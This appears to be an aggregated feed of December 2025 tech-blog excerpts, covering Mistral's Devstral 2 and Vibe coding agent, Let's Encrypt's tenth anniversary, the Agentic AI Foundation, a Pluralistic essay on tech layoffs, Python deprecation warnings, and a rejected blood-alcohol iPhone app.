      <p>NBC News reports that Trump Mobile customers have been waiting months for a promised ‘Made in the USA’ smartphone, originally announced for August delivery. The T1 phone was marketed as domestically produced, but delays and vague updates have raised skepticism. References to ‘Made in the USA’ have been removed from the company’s site, and leaked images suggest the device resembles existing Chinese-made models. This situation underscores the complexity of building smartphones in America without established infrastructure.</p>

      <p>
      <p>The FBI is <a href="https://www.ic3.gov/PSA/2025/PSA251205">warning</a> of AI-assisted fake kidnapping scams:</p>
<blockquote>
<p>Criminal actors typically will contact their victims through text message claiming they have kidnapped their loved one and demand a ransom be paid for their release. Oftentimes, the criminal actor will express significant claims of violence towards the loved one if the ransom is not paid immediately. The criminal actor will then send what appears to be a genuine photo or video of the victim’s loved one, which upon close inspection often reveals inaccuracies when compared to confirmed photos of the loved one. Examples of these inaccuracies include missing tattoos or scars and inaccurate body proportions. Criminal actors will sometimes purposefully send these photos using timed message features to limit the amount of time victims have to analyze the images...</p>

      <p>
      <p>In a recent New York Times opinion essay, “There’s a Link Between Therapy Culture and Childlessness,” Michal Leibowitz discusses our culture’s tendency to blame parents (let’s be honest here: mothers) for an adult child’s problems. When I first handed beta</p>

      <p><strong><a href="https://letsencrypt.org/2025/12/09/10-years">10 Years of Let's Encrypt</a></strong></p>
<p>Internet Security Research Group co-founder and Executive Director Josh Aas:</p>
<blockquote>
<p>On September 14, 2015, <a href="https://crt.sh/?id=9314793">our first publicly-trusted certificate went live</a>. [...] Today, Let’s Encrypt is the largest certificate authority in the world in terms of certificates issued, the ACME protocol we helped create and standardize is integrated throughout the server ecosystem, and we’ve become a household name among system administrators. We’re closing in on protecting one billion web sites.</p>
</blockquote>
<p>Their growth rate and numbers are wild:</p>
<blockquote>
<p>In March 2016, we issued our one millionth certificate. Just two years later, in September 2018, we were issuing a million certificates every day. In 2020 we reached a billion total certificates issued and as of late 2025 we’re frequently issuing ten million certificates per day.</p>
</blockquote>
<p>According to <a href="https://letsencrypt.org/stats/">their stats</a> the amount of Firefox traffic protected by HTTPS doubled from 39% at the start of 2016 to ~80% today. I think it's difficult to over-estimate the impact Let's Encrypt has had on the security of the web.</p>

      <h1>Devstral 2</h1>

(date: 2025-12-09)
      <p>
      <p><strong><a href="https://mistral.ai/news/devstral-2-vibe-cli">Devstral 2</a></strong></p>
<p>Two new models from Mistral today: Devstral 2 and Devstral Small 2 - both focused on powering coding agents such as Mistral's newly released Mistral Vibe which <a href="https://simonwillison.net/2025/Dec/9/mistral-vibe/">I wrote about earlier today</a>.</p>
<blockquote>
<ul>
<li>Devstral 2: SOTA open model for code agents with a fraction of the parameters of its competitors and achieving 72.2% on SWE-bench Verified.</li>
<li>Up to 7x more cost-efficient than Claude Sonnet at real-world tasks.</li>
</ul>
</blockquote>
<p>Devstral 2 is a 123B model released under a janky license - it's &quot;modified MIT&quot; where <a href="https://huggingface.co/mistralai/Devstral-2-123B-Instruct-2512/blob/main/LICENSE">the modification</a> is:</p>
<blockquote>
<p>You are not authorized to exercise any rights under this license if the global consolidated monthly revenue of your company (or that of your employer) exceeds $20 million (or its equivalent in another currency) for the preceding month. This restriction in (b) applies to the Model and any derivatives, modifications, or combined works based on it, whether provided by Mistral AI or by a third party. [...]</p>
</blockquote>
<p>Mistral Small 2 is under a proper Apache 2 license with no weird strings attached. It's a 24B model which is <a href="https://huggingface.co/mistralai/Devstral-Small-2-24B-Instruct-2512">51.6GB on Hugging Face</a> and should quantize to significantly less.</p>
<p>I tried out the larger model via <a href="https://github.com/simonw/llm-mistral">my llm-mistral plugin</a> like this:</p>
<pre><code>llm install llm-mistral
llm mistral refresh
llm -m mistral/devstral-2512 &quot;Generate an SVG of a pelican riding a bicycle&quot;

</code></pre>
<p><img src="https://static.simonwillison.net/static/2025/devstral-2.jpg" alt="Bicycle looks a bit like a cybertruck"></p>
<p>For a ~120B model that one is pretty good!</p>
<p>Here's the same prompt with <code>-m mistral/labs-devstral-small-2512</code> for the API hosted version of Devstral Small 2:</p>
<p><img src="https://static.simonwillison.net/static/2025/devstral-small-2.jpg" alt="A small white pelican on what looks more like a child's cart."></p>
<p>Again, a decent result given the small parameter size. For comparison, <a href="https://simonwillison.net/2025/Jun/20/mistral-small-32/">here's what I got</a> for the 24B Mistral Small 3.2 earlier this year.</p>

<h4>Build Canada and Canada Spends</h4>
<p><a href="https://www.buildcanada.com/">Build Canada</a> is a volunteer-driven non-profit that launched in February 2025 - here's <a href="https://www.canadianaffairs.news/2025/09/26/builders-at-the-gate-inside-the-civic-movement-to-jolt-canada-out-of-stagnation/">some background information</a> on the organization, which has a strong pro-entrepreneurship and pro-technology angle.</p>
<p><a href="https://canadaspends.com/">Canada Spends</a> is their project to make Canadian government financial data more accessible and explorable. It includes a tax sources and sinks visualizer and a searchable database of government contracts, plus a collection of tools covering financial data from different levels of government.</p>
<h4>Datasette for data exploration</h4>
<p>The project maintains a Datasette instance at <a href="https://api.canadasbuilding.com/">api.canadasbilding.com</a> containing the data they have gathered and processed from multiple data sources - currently more than 2 million rows plus a combined search index across a denormalized copy of that data.</p>

<h4>Processing PDFs</h4>
<p>The highest quality government financial data comes from the audited financial statements that every Canadian government department is required to publish. As is so often the case with government data, these are usually published as PDFs.</p>
<p>Brendan has been using Gemini to help extract data from those PDFs. Since this is accounting data the numbers can be summed and cross-checked to help validate the LLM didn't make any obvious mistakes.</p>

      <h1>Agentic AI Foundation</h1>

(date: 2025-12-09)
      <p>
      <p><strong><a href="https://aaif.io/">Agentic AI Foundation</a></strong></p>
<p>Announced today as a new foundation under the parent umbrella of the Linux Foundation (see also the OpenJS Foundation, Cloud Native Computing Foundation, OpenSSF and <a href="https://www.linuxfoundation.org/projects">many more</a>).</p>
<p>The AAIF was started by a heavyweight group of &quot;founding platinum members&quot; ( <a href="https://aaif.io/members/#join">$350,000</a>): AWS, Anthropic, Block, Bloomberg, Cloudflare, Google, Microsoft, and OpenAI. The <a href="https://aaif.io/press/linux-foundation-announces-the-formation-of-the-agentic-ai-foundation-aaif-anchored-by-new-project-contributions-including-model-context-protocol-mcp-goose-and-agents-md/">stated goal</a> is to provide &quot;a neutral, open foundation to ensure agentic AI evolves transparently and collaboratively&quot;.</p>
<p>Anthropic have <a href="https://www.anthropic.com/news/donating-the-model-context-protocol-and-establishing-of-the-agentic-ai-foundation">donated Model Context Protocol</a> to the new foundation, OpenAI <a href="https://openai.com/index/agentic-ai-foundation/">donated AGENTS.md</a>, Block <a href="https://block.xyz/inside/block-anthropic-and-openai-launch-the-agentic-ai-foundation">donated goose</a> (their <a href="https://github.com/block/goose">open source, extensible AI agent</a>).</p>
<p>Personally the project I'd like to see most from an initiative like this one is a clear, community-managed specification for the OpenAI Chat Completions JSON API - or a close equivalent. There are dozens of slightly incompatible implementations of that not-quite-specification floating around already, it would be great to have a written spec accompanied by a compliance test suite.</p>

      <p>
      <p><strong><a href="https://github.com/mistralai/mistral-vibe">mistralai/mistral-vibe</a></strong></p>
<p>Here's the Apache 2.0 licensed source code for Mistral's new &quot;Vibe&quot; CLI coding agent, <a href="https://mistral.ai/news/devstral-2-vibe-cli">released today</a> alongside Devstral 2.</p>
<p>It's a neat implementation of the now standard terminal coding agent pattern, built in Python on top of Pydantic and Rich/Textual (here are <a href="https://github.com/mistralai/mistral-vibe/blob/v1.0.4/pyproject.toml#L29-L46">the dependencies</a>.) <a href="https://github.com/google-gemini/gemini-cli">Gemini CLI</a> is TypeScript, Claude Code is closed source (TypeScript, now <a href="https://simonwillison.net/2025/Dec/2/anthropic-acquires-bun/">on top of Bun</a>), OpenAI's <a href="https://github.com/openai/codex">Codex CLI</a> is Rust. <a href="https://github.com/OpenHands/OpenHands">OpenHands</a> is the other major Python coding agent I know of, but I'm likely missing some others. (UPDATE: <a href="https://github.com/MoonshotAI/kimi-cli">Kimi CLI</a> is another open source Apache 2 Python one.)</p>
<p>The Vibe source code is pleasant to read and the crucial prompts are neatly extracted out into Markdown files. Some key places to look:</p>
<ul>
<li><a href="https://github.com/mistralai/mistral-vibe/blob/v1.0.4/vibe/core/prompts/cli.md">core/prompts/cli.md</a> is the main system prompt (&quot;You are operating as and within Mistral Vibe, a CLI coding-agent built by Mistral AI...&quot;)</li>
<li><a href="https://github.com/mistralai/mistral-vibe/blob/v1.0.4/vibe/core/prompts/compact.md">core/prompts/compact.md</a> is the prompt used to generate compacted summaries of conversations (&quot;Create a comprehensive summary of our entire conversation that will serve as complete context for continuing this work...&quot;)</li>
<li>Each of the core tools has its own prompt file:
<ul>
<li><a href="https://github.com/mistralai/mistral-vibe/blob/v1.0.4/vibe/core/tools/builtins/prompts/bash.md">.../prompts/bash.md</a></li>
<li><a href="https://github.com/mistralai/mistral-vibe/blob/v1.0.4/vibe/core/tools/builtins/prompts/grep.md">.../prompts/grep.md</a></li>
<li><a href="https://github.com/mistralai/mistral-vibe/blob/v1.0.4/vibe/core/tools/builtins/prompts/read_file.md">.../prompts/read_file.md</a></li>
<li><a href="https://github.com/mistralai/mistral-vibe/blob/v1.0.4/vibe/core/tools/builtins/prompts/write_file.md">.../prompts/write_file.md</a></li>
<li><a href="https://github.com/mistralai/mistral-vibe/blob/v1.0.4/vibe/core/tools/builtins/prompts/search_replace.md">.../prompts/search_replace.md</a></li>
<li><a href="https://github.com/mistralai/mistral-vibe/blob/v1.0.4/vibe/core/tools/builtins/prompts/todo.md">.../prompts/todo.md</a></li>
</ul>
</li>
</ul>
<p>The Python implementations of those tools <a href="https://github.com/mistralai/mistral-vibe/tree/v1.0.4/vibe/core/tools/builtins">can be found here</a>.</p>
<p>I tried it out and had it build me a Space Invaders game using three.js with the following prompt:</p>
<blockquote>
<p><code>make me a space invaders game as HTML with three.js loaded from a CDN</code></p>
</blockquote>
<p><img src="https://static.simonwillison.net/static/2025/vibe.gif" alt="Animated screenshot demo of Mistral Vibe running in a terminal. The text reads: I've created a Space Invaders game using HTML and Three. js loaded from a CDN. The game is now available in the file space_invaders.html in your current directory. Here's how to play: 1. Open the space_invaders.html file in a web browser 2. Use the left and right arrow keys to move your player (green rectangle) 3. Press the spacebar to shoot at the invaders (red rectangles) 4. Try to get the highest score before the invaders reach you or hit you with their bullets The game features: © Player movement with arrow keys © Shooting mechanics with spacebar © Enemy invaders that move back and forth © Collision detection « Score tracking * Game over screen © Increasing difficulty Writing file (64s esc to interrupt) »» auto-approve on (shift-tab to toggle) - 7% of 100k tokens"></p>
<p>Here's <a href="https://github.com/simonw/space-invaders-by-llms/blob/main/mistral-vibe-devstral-2/index.html">the source code</a> and <a href="https://space-invaders.simonwillison.net/mistral-vibe-devstral-2/">the live game</a> (hosted in my new <a href="https://github.com/simonw/space-invaders-by-llms">space-invaders-by-llms</a> repo).

      <blockquote>
<p>The promise of AI – the promise AI companies make to investors – is that there will be AIs that can do your job, and when your boss fires you and replaces you with AI, he will keep half of your salary for himself, and give the other half to the AI company.</p>
<p>That’s it.</p>
<p>That’s the $13T growth story that MorganStanley is telling. It’s why big investors and institutionals are giving AI companies hundreds of billions of dollars. And because <em>they</em> are piling in, normies are also getting sucked in, risking their retirement savings and their family’s financial security.</p>
<p>Now, if AI could do your job, this would <em>still</em> be a problem. We’d have to figure out what to do with all these technologically unemployed people.</p>
<p>But AI can’t do your job. It can <em>help</em> you do your job, but that doesn’t mean it’s going to save anyone money.</p>

I implemented <a href="http://scripting.com/2025/04/14/121946.html">Inbound RSS</a> for WordPress. I was going to request it as a feature from the WordPress community, then realized I could write it fairly quickly with the system I already have built. After all, FeedLand already supports Inbound RSS, that's a lot of what it does, as a feed reader, esp along with the websocket interface it has. I already have complete code for writing to a WordPress site, that's a big part of what WordLand does. WordPress does a fantastic job of outbound RSS, but why not inbound? If Substack, for example, supported inbound, we'd all be using their mail distribution systems, and sharing revenue.

<blockquote>
<p>In medical research, there’s a practice of ending a study early when the results are too striking to ignore. We stop when there is unexpected harm. We also stop for overwhelming benefit, when a treatment is working so well that it would be unethical to continue giving anyone a placebo. When an intervention works this clearly, you change what you do...</p>

      <h1>Pluralistic: Big Tech joins the race to build the world's heaviest airplane (09 Dec 2025)</h1>

(date: 2025-12-09)
      <p>
      <p>Today's links Big Tech joins the race to build the world's heaviest airplane: Die as Microsoft, or live to become the IBM you overthrew. Hey look at this: Delights to delectate. Object permanence: Bean-sprouting keyboard; Ink rant; FBI wanted to deport John Lennon; &quot;Concrete Park&quot;; Plutocratic lane-changes. Upcoming appearances: Where to find me. Recent appearances: Where I've been. Latest books: You keep readin' em, I'll keep writin' 'em. Upcoming books: Like I said, I'll keep writin' 'em. Colophon: All the rest. Big Tech joins the race to build the world's heaviest airplane (permalink) I have a weird fascination with early-stage Bill Gates, after his mother convinced a pal of hers – chairman of IBM's board of directors – to give her son the contract to provide the operating system for the new IBM PC. Gates and his pal Paul Allen tricked another programmer into selling them the rights to DOS, which they sold to IBM, setting Microsoft on the path to be one of the most profitable businesses in human history. IBM could have made its own OS, of course. They were just afraid to, because they'd just narrowly squeaked out of a 12-year antitrust war with the Department of Justice (evocatively memorialized as &quot;Antitrust's Vietnam&quot;): <a href="https://pluralistic.net/2022/10/02/the-true-genius-of-tech-leaders/">https://pluralistic.net/2022/10/02/the-true-genius-of-tech-leaders/</a> The US government traumatized IBM so badly that they turned over their crown jewels to these two prep-school kids, who scammed a pal out of his operating system for <span class="math inline">\(50k and made billions from it. Despite owing his business to IBM (or perhaps because of this fact), Gates routinely mocked IBM as a lumbering dinosaur that was headed for history's scrapheap. He was particularly scornful of IBM's software development methodology, which, to be fair, was pretty terrible: IBM paid programmers by the line of code. Gates called this "the race to build the world's heaviest airplane." After all, judging software by lines of code is a terrible idea. To the extent that "number of lines of code" has any correlation with software quality, reliability or performance, it has a negative correlation. While it's certainly possible to write software with too few lines of code (e.g. when instructions are stacked on a single line, obfuscating its functionality and making it hard to maintain), it's far more common for programmers to use too many steps to solve a problem. The ideal software is just right: verbose enough to be legible to future maintainers, streamlined enough to omit redundancies. This is broadly true of many products, and not just airplanes. Office memos should be long enough to be clear, but no longer. Home insulation should be sufficient to maintain the internal temperature, but no more. Ironically, enterprise tech companies' bread and butter is selling exactly this kind of qualitative measurement for bosses who want an easy, numeric way to decide which of their workers to fire, and leading the pack is Microsoft, whose flagship Office365 lets bosses assess their workers' performance on meaningless metrics like how many words they type, ranking each worker against other workers within the division, with rival divisions and within rival firms. Yes, Microsoft actually boasts to companies about the fact that if you use their products, they will gather sensitive data about how your workers perform individually and as a team, and share that information with your competitors! https://pluralistic.net/2020/11/25/the-peoples-amazon/#clippys-revenge But while tech companies employed programmers to develop this kind of bossware to be used on other companies' employees, they were loath to apply them to their own workers. For one thing, it's just a very stupid way to manage a workforce, as Bill Gates himself would be the first to tell you (candidly, provided he wasn't trying to sell you an enterprise Office 365 license). For another, tech workers wouldn't stand for it. After all, these were the "princes of labor," each adding a million dollars or more to their boss's bottom line, and in such scarce supply that a coder could quit a job after the morning scrum and have a new one by the pre-dinner pickleball break: https://pluralistic.net/2025/04/27/some-animals/#are-more-equal-than-others Tech workers mistook the fear this dynamic instilled in their bosses for respect. They thought the reason their bosses gave them free massage therapists and kombucha on tap and a gourmet cafeteria was that their bosses liked them. After all, these bosses were all techies. A coder wasn't a worker, they were a temporarily embarrassed founder. That's why Zuck and Sergey tuned into those engineering town hall meetings and tolerated being pelted with impertinent questions about the company's technology and business strategy. Actually, tech bosses didn't like tech workers. They didn't see them as peers. They saw them as workers. Problem workers, at that. Problems to be solved. And wouldn't you know it, supply caught up with demand and tech companies instituted a program of mass layoffs. When Google laid off 12,000 workers (just before a \)</span>80b stock buyback that would have paid their wages for 27 years), they calmed investors by claiming that they weren't doing this because business was bad – they were just correcting some pandemic-era overhiring. But Google didn't just fire junior programmers – they targeted some of their most senior (and thus mouthiest and highest-paid) techies for the chop. Today, Sergey and Zuck no longer attend engineering meetings (&quot;Not a good use of my time&quot; -M. Zuckerberg). Tech workers are getting laid off at the rate of naughts. And none of these bastards can shut up about how many programmers they plan on replacing with AI: <a href="https://pluralistic.net/2025/08/05/ex-princes-of-labor/#hyper-criti-hype">https://pluralistic.net/2025/08/05/ex-princes-of-labor/#hyper-criti-hype</a> And wouldn't you know it, the shitty monitoring and ranking technology that programmers made to be used on other workers is finally being used on them: <a href="https://jonready.com/blog/posts/everyone-in-seattle-hates-ai.html">https://jonready.com/blog/posts/everyone-in-seattle-hates-ai.html</a> Naturally, the excuse is monitoring AI usage. Microsoft – along with all the other AI-peddling tech companies – keeps claiming that their workers adore using AI to write software, but somehow, also have to monitor workers so they can figure out which ones to fire because they're not using AI enough: <a href="https://www.itpro.com/software/development/microsoft-claims-ai-is-augmenting-developers-rather-than-replacing-them">https://www.itpro.com/software/development/microsoft-claims-ai-is-augmenting-developers-rather-than-replacing-them</a> This is the &quot;shitty technology adoption curve&quot; in action. When you have a terrible, destructive technology, you can't just deploy it on privileged people who get taken seriously in policy circles. You start with people at the bottom of the privilege gradient: prisoners, mental patients, asylum-seekers. Then, you work your way up the curve – kids, gig workers, blue collar workers, pink collar workers. Eventually, it comes for all of us: <a href="https://pluralistic.net/2021/02/24/gwb-rumsfeld-monsters/#bossware">https://pluralistic.net/2021/02/24/gwb-rumsfeld-monsters/#bossware</a> As Ed Zitron writes, tech hasn't had a big, successful product (on the scale of, say, the browser or the smartphone) in more than a decade. Tech companies have seemingly run out of new trillion-dollar industries to spawn. Tech bosses are pulling out all the stops to make their companies seem as dynamic and profitable as they were in tech's heyday. Firing workers and blaming it on AI lets tech bosses transform a story that would freak out investors (&quot;Our business is flagging and we had to fire a bunch of valuable techies&quot;) into one that will shake loose fresh billions in capital (&quot;Our AI product is so powerful it let us fire a zillion workers!&quot;). And for tech bosses, mass layoffs offer another, critical advantage: pauperizing those princes of labor, so that they can shed their company gyms and luxury commuter busses, cut wages and benefits, and generally reset the working expectations of the tech workers who sit behind a keyboard to match the expectations of tech workers who assemble iPhones, drive delivery vans, and pack boxes in warehouses. For tech workers who currently don't have a pee bottle or a suicide net at their job-site, it's long past time to get over this founder-in-waiting bullshit and get organized. Recognize that you're a worker, and that workers' only real source of power isn't ephemeral scarcity, it's durable solidarity: <a href="https://techworkerscoalition.org/">https://techworkerscoalition.org/</a> (Image: Cryteria, CC BY 3.0, modified) Hey look at this (permalink) Your Data Might Determine How Much You Pay for Eggs <a href="https://www.wired.com/story/algorithmic-pricing-eggs-ny-law/">https://www.wired.com/story/algorithmic-pricing-eggs-ny-law/</a> Judge hints Vizio TV buyers may have rights to source code licensed under GPL <a href="https://www.theregister.com/2025/12/05/vizio">https://www.theregister.com/2025/12/05/vizio</a>_gpl_source_code_ruling/ Chamberlain blocks smart home integrations with its garage door openers — again <a href="https://www.theverge.com/tech/839294/chamberlain-myq-garage-door-opener-update-blocks-aftermarket-controllers">https://www.theverge.com/tech/839294/chamberlain-myq-garage-door-opener-update-blocks-aftermarket-controllers</a> Smart Garage Door Opener <a href="https://3reality.com/product/smartgarage-door-opener/">https://3reality.com/product/smartgarage-door-opener/</a> The Best Books in eBooks and Audiobooks of 2025 <a href="https://www.kobo.com/us/en/p/best-books-of-2025">https://www.kobo.com/us/en/p/best-books-of-2025</a> Object permanence (permalink) #20yrsago WaWa Digital Cameras threatens to break customer’s neck <a href="https://thomashawk.com/2005/12/abusive-new-york-camera-store.html">https://thomashawk.com/2005/12/abusive-new-york-camera-store.html</a> #20yrsago Keyboard used as bean-sprouting medium <a href="https://web.archive.org/web/20051205011830/http://www.nada.kth.se/~hjorth/krasse/english.html">https://web.archive.org/web/20051205011830/http://www.nada.kth.se/~hjorth/krasse/english.html</a> #15yrsago Judge to copyright troll: get lost <a href="https://torrentfreak.com/acslaw-take-alleged-file-sharers-to-court-but-fail-on-a-grand-scale-101209/">https://torrentfreak.com/acslaw-take-alleged-file-sharers-to-court-but-fail-on-a-grand-scale-101209/</a> #15yrsago Ink cartridge rant <a href="https://web.archive.org/web/20101211080931/http://www.inkcartridges.uk.com/Remanufactured-HP-300-CC640EE-Black.html">https://web.archive.org/web/20101211080931/http://www.inkcartridges.uk.com/Remanufactured-HP-300-CC640EE-Black.html</a> #15yrsago 1.1 billion US<span class="math inline">\(100 notes out of circulation due to printing error https://www.cnbc.com/2010/12/07/the-fed-has-a-110-billion-problem-with-new-benjamins.html #15yrsago EFF wants Righthaven to pay for its own ass-kicking https://web.archive.org/web/20101211011932/https://www.wired.com/threatlevel/2010/12/payup-troll/ #15yrsago danah boyd explains email sabbaticals https://www.zephoria.org/thoughts/archives/2010/12/08/i-am-offline-on-email-sabbatical-from-december-9-january-12.html #15yrsago TSA subjects India’s US ambassador to public grope because of her sari https://web.archive.org/web/20101211113821/http://travel.usatoday.com/flights/post/2010/12/india-diplomat-gets-humiliating-pat-down-at-mississippi-airport-/134197/5?csp=outbrain&amp;csp=obnetwork #15yrsago California’s safety codes are now open source!

<p>Martin Kleppmann makes the case for formal verification languages (things like <a href="https://dafny.org/">Dafny</a>, <a href="https://github.com/marcoeilers/nagini">Nagini</a>, and <a href="https://github.com/verus-lang/verus">Verus</a>) to finally start achieving more mainstream usage. Code generated by LLMs can benefit enormously from more robust verification, and LLMs themselves make these notoriously difficult systems easier to work with.</p>
<p>The paper <a href="https://arxiv.org/abs/2503.14183">Can LLMs Enable Verification in Mainstream Programming?</a> by JetBrains Research in March 2025 found that Claude 3.5 Sonnet saw promising results for the three languages I listed above.</p>

      <h1>Deprecations via warnings don’t work for Python libraries</h1>

(date: 2025-12-09)
      <p>
      <p><strong><a href="https://sethmlarson.dev/deprecations-via-warnings-dont-work-for-python-libraries">Deprecations via warnings don’t work for Python libraries</a></strong></p>
<p>Seth Larson reports that <a href="https://github.com/urllib3/urllib3/blob/main/CHANGES.rst#260-2025-12-05">urllib3 2.6.0</a> released on the 5th of December and finally removed the <code>HTTPResponse.getheaders()</code> and <code>HTTPResponse.getheader(name, default)</code> methods, which have been marked as deprecated via warnings since <a href="https://github.com/urllib3/urllib3/releases/tag/2.0.0">v2.0.0 in April 2023</a>. They had to <em>add them back again</em> in a hastily released <a href="https://github.com/urllib3/urllib3/blob/main/CHANGES.rst#261-2025-12-08">2.6.1</a> a few days later when it turned out major downstream dependents such as <a href="https://github.com/kubernetes-client/python/issues/2280">kubernetes-client</a> and <a href="https://github.com/fastly/fastly-py/pull/112">fastly-py</a> still hadn't upgraded.</p>
<p>Seth says:</p>
<blockquote>
<p>My conclusion from this incident is that <a href="https://docs.python.org/3/library/exceptions.html#DeprecationWarning"><code>DeprecationWarning</code></a> in its current state does not work for deprecating APIs, at least for Python libraries. That is unfortunate, as <code>DeprecationWarning</code> and the <a href="https://docs.python.org/3/library/warnings.html"><code>warnings</code> module</a> are easy-to-use, language-&quot;blessed&quot;, and explicit without impacting users that don't need to take action due to deprecations.</p>
</blockquote>
<p>On Lobste.rs James Bennett <a href="https://lobste.rs/s/pvaalr/deprecations_via_warnings_don_t_work_for#c_smnajm">advocates for watching for warnings more deliberately</a>:</p>
<blockquote>
<p>Something I always encourage people to do, and try to get implemented anywhere I work, is running Python test suites with <code>-Wonce::DeprecationWarning</code>. This doesn't spam you with noise if a deprecated API is called a lot, but still makes sure you see the warning so you know there's something you need to fix.</p>
</blockquote>
<p>I didn't know about the <code>-Wonce</code> option - <a href="https://docs.python.org/3/using/cmdline.html#cmdoption-W">the documentation</a> describes that as &quot;Warn once per Python process&quot;.</p>

      <h1>@Dave Winer's Scripting News</h1>

      <p><img src="https://imgs.scripting.com/2025/11/15/pluribus.png" alt=""><a href="https://en.wikipedia.org/wiki/Pluribus_(TV_series)">Pluribus</a> is not, at least so far, equal to <a href="https://en.wikipedia.org/wiki/Breaking_Bad">Breaking Bad</a> or <a href="https://en.wikipedia.org/wiki/Better_Call_Saul">Better Call Saul</a>. Some parts are confusing, some are poorly edited. They try to have a shocker or cliff hanger at the end of episodes, but they aren't very shocking and the cliff turns out to be something so obvious that you could swear they already told us that. Breaking Bad and Better Call Saul were <a href="https://www.youtube.com/watch?v=valsk3cd9gc&amp;t=1s">exquisitly crafted TV</a>. The incredible shots they took, many of them were works of art all on their own. Maybe it was the combination of factors. The skill of <a href="https://en.wikipedia.org/wiki/Vince_Gilligan">Vince Gilligan's</a> team, combined with our admiration for <a href="https://en.wikipedia.org/wiki/Rhea_Seehorn">Rhea Seehorn</a>, and the gravitas of Apple TV and one of the other great shows of our time, <a href="https://daytona.scripting.com/search?q=severance">Severance</a>. That made the conclusion obvious, by lineage this must be the <em>best show ever.</em> It's always that way, in sports for example. You could assemble a team of superstars, and they don't even make the playoffs. Because it's the whole thing that makes it so hard to beat. But! I am hooked, I love the show, it's hard to imagine anything could get me to not reserve Thurs at 9PM to watch the latest episode, all I ask is no more humans eating dog food. Please, <em>that</em> was too much. It's sad however that there are only two episodes left in this season, but then comes all the holiday releases, and this year it seems most of it is on streaming services, not in theaters.</p>

      <h1>My App Will Harm You Physically, Using Math</h1>

(date: 2025-12-08)
      <p>
      <p><img src="https://images.squarespace-cdn.com/content/v1/53f4e093e4b085e4457080e1/3ca193d4-0776-424a-a264-85560f4e865f/nog_02_A1.jpg?format=1000w" alt=""></p>
<p>Log your nog with Drinking Buddy.</p>
<p>I made an app! A real, native iPhone app coded in Swift and SwiftUI.</p>
<p>It’s a thing of beauty. I love it and use it every day. But I can’t share it with you, because Apple rejected it from the App Store due to “Physical Harm.”</p>
<p>Don’t worry, I figured out a workaround. That’s how determined I am to harm you.</p>
<h2>Everyone, <em>Finally,</em> Can Code — by Not Coding</h2>
<p>I created this app by “vibe-coding” it — prompting it into existence via AI — using an iPhone app called <a href="https://www.bitrig.com">Bitrig</a>. Bitrig is the brainchild of some folks who helped create the Swift programing language that Apple now favors for all iOS/iPadOS development. There are many AI-assisted app creation platforms out there, but Bitrig has two (currently) unique value propositions: It creates native iPhone apps, and it works on your phone.</p>
<p>Building iPhone apps right on your phone is fun! And, of course, maddening, because AI — but when it works, it’s delightful and rather amazing.</p>
<h2>On Vibe Coding, Briefly</h2>
<p><a href="https://bsky.app/profile/kevlin.bsky.social">Kevlin Henney</a> (via <a href="https://atp.fm/633">John Siracusa</a>):</p>
<blockquote>
<p>The act of describing a program in unambiguous detail and the act of programming are one and the same.</p>
</blockquote>
<p>I have complex feelings about AI and creativity, but this quote feels right to me — <em>I created</em> this app using AI, even though I didn’t write one line of code.</p>
<p>If you’ve tried anything like this you know that the process is a mix of the miraculous and the infuriating. You’ll get a working prototype up and running in minutes, and then argue with a cheerful robot for 15 fruitless prompts about the color of a button. Complex features come together with ease, while a bug fix might take dozens of attempts to fix, and risk reverting previous fixes.</p>
<p>It’s a bit like building an app by talking to a polite and well-meaning tech support agent on the phone — only their computer is down and they can’t test the app themselves.</p>
<p>But power through it, and you have an app.</p>
<p>I’m sure I’ll have more to say about that in the future, but let’s get on to what my app is, and why Apple rejected it.</p>
<h2>The Many Lives of Drinking Buddy</h2>
<p><img src="https://images.squarespace-cdn.com/content/v1/53f4e093e4b085e4457080e1/fa1d8972-2a07-4425-8b97-3d572f3ce6d7/PDF%2Bdocument-2-1-4.jpeg.webp?format=1000w" alt=""></p>
<p>The Drinking Buddy Shortcut, before iOS 26 made Shortcuts menus absolutely hideous.</p>
<p>In 2018 I released a <a href="https://prolost.com/blog/bicycle">Shortcut</a> called Drinking Buddy that helps you keep track of your alcohol consumption. I mostly share the tools and automations I create to support creative work, but here I was sharing something personal. I enjoy a drink from time to time, and I wanted a tool to help me be thoughtful and intentional about that. Drinking Buddy does this by showing how many drinks you’ve had in the last seven days (a question your doctor might ask), and by estimating your current Blood Alcohol Level based on your recent drinks.</p>
<p>This estimation is done using the <a href="https://en.wikipedia.org/wiki/Blood_alcohol_content">Widmark Formula</a>, which has been around since the 1930s. It’s a simple equation that uses your gender and body weight to model how you metabolize alcohol over time.</p>
<p>I’ve updated Drinking Buddy many times in the seven years since I first shared it. It’s a shining/ridiculous example of how I’ve pushed Shortcuts past the point that any reasonable person would consider sane. I wanted to create an app-like experience, but I was always fighting the limitations of a tool designed primarily for simple automations.</p>
<h2>Drinking Buddy: The App</h2>
<p>This is the version of Drinking Buddy that I created using Bitrig:</p>
<p><img src="https://images.squarespace-cdn.com/content/v1/53f4e093e4b085e4457080e1/5bd3a365-d4eb-4d3e-b828-f751e5da6f53/db_251119.png?format=1000w" alt=""></p>
<p>The App Store page that will never be.</p>
<p>Use the big buttons to log drinks. Your estimated BAC appears on the left, in a fun little gauge that animates when it changes. Your weekly drinks are charted on the right, as well as a rolling weekly average of drinks/day.</p>
<p>What started as my first real vibe-coding experiment took me down a rabbit hole of refining this design, tweaking the user experience, and, unfortunately, liking the results enough to want to share them.</p>
<h2>Apple Holds the Keys</h2>
<p>In 2016 Apple <a href="https://www.healthcareittoday.com/2016/09/13/apple-app-store-toughens-guidelines-for-health-apps/">formalized</a> its distaste for dubious health-related apps with strengthened guidelines. Although <a href="https://developer.apple.com/app-store/review/guidelines/#physical-harm">section 1.4</a>, called <strong>Physical Harm,</strong> doesn’t specifically call out blood alcohol calculators, the language in my App Store rejection did:</p>
<blockquote>
<p>To ensure users' safety, only blood alcohol content calculator apps that pair with hardware capable of offering accurate blood alcohol content measurements are appropriate. Apps that rely solely on software, Widmark formulas, or other mechanisms to calculate blood alcohol content are not appropriate.</p>
</blockquote>
<h2>Consistency is the Hobgoblin of, Well, Not the App Store</h2>
<p>One reason I thought I might be able to get Drinking Buddy onto the App Store is that there are <em>many</em> BAC calculators currently available there. I won’t link them here,1 as I don’t feel it’s my place to rat them out, but their abundance led me to believe it might be possible to pepper one’s app with enough warnings and admonitions that it would be considered “safe.”</p>
<p>So I appealed my rejection, and it was upheld in no uncertain terms.</p>
<h2>A Solution so Sweet</h2>
